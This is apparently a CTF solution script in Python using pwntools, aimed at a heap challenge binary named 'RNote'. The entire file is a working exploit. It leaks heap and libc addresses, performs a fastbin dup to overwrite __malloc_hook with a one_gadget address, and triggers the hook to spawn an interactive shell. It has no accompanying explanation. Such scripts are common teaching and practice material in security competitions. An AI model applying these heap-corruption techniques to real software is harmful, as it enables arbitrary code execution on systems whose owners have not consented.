from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./RNote"
bin = ELF(file)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

conn = process(file, env=env)
#gdb.attach(conn)

def menu(ch):
    conn.recvuntil("Your choice: ")
    conn.sendline(str(ch))

def add(size, title, content, shell=False):
    menu(1)
    conn.recvuntil("note size:")
    conn.sendline(str(size))
    if shell:
        return
    conn.recvuntil("title")
    conn.send(title)
    conn.recvuntil("content")
    conn.send(content)

def delete(idx):
    menu(2)
    conn.recvuntil("want to")
    conn.sendline(str(idx))

def show(idx):
    menu(3)
    conn.recvuntil("want to")
    conn.sendline(str(idx))

# Heap and Libc leak
add(0x90, "title\n", "a")
add(0x90, "title\n", "a")
add(0x90, "title\n", "a")
add(0x90, "title\n", "a")
delete(0)
delete(2)
add(0x90, "title\n", "a"*8)
show(0)
conn.recvuntil("a"*8)
heap_leak = u64(conn.recvn(8))
add(0x90, "title\n", "a"*8)
show(2)
conn.recvuntil("a"*8)
libc_leak = u64(conn.recvn(8))

#libc.address = libc_leak - 0x7f8331a35b78 + 0x7f8331671000
libc.address = libc_leak - 0x7f52ccb83b78 + 0x7f52cc7c0000

log.info("Libc leak: " + hex(libc_leak))
log.info("Heap leak: " + hex(heap_leak))

# Fastbin dup
add(0x60, "title\n", "a"*8) # 4
add(0x60, "title\n", "a"*8) # 5
add(0x60, "a"*0x10 + "\x00", "a"*8) # 6

delete(5)
delete(4)
delete(6)

add(0x60, "title\n", p64(libc.symbols['__malloc_hook'] - 0x23)) # 4
add(0x60, "title\n", "a"*8)
add(0x60, "title\n", "a"*8)
add(0x60, "title\n", "\x00"*(0x23 - 0x10) + p64(libc.address + 0xf0567))
add(0x60, "title\n", "a", shell=True)

conn.interactive()
